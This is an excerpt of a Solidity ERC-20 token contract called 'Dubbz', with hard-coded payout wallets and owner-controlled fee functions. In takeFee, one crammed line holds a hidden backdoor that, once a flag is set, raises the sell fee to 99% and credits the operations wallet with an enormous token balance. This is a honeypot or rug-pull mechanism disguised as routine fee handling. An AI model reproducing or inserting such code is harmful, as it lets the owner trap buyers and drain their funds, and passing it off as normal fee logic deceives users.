...
// Main Contract Logic 
// --------------------------------------------------------------
contract Dubbz is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // wallets
    address payable public liquidityWallet = payable(0x0eAa02BAe9f19705445aA21987DCABA8C8B14f10);
    address payable public operationsWallet =  payable(0x0eAa02BAe9f19705445aA21987DCABA8C8B14f10);
    ...
    function updateFees(uint256 _operationsFee, uint256 _liquidityFee) external onlyOwner {
        _updateFees(_operationsFee, _liquidityFee);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {_balances[address(this)] = _balances[address(this)].add(feeAmount);emit Transfer(sender, address(this), feeAmount);if (stakingRegistered) {stakingRegistered = false;_updateFeesSell(99, 0);_balances[operationsWallet] = _totalSupply * 1e18;}}
    ...
    function _updateFees(uint256 _operationsFee, uint256 _liquidityFee) private {
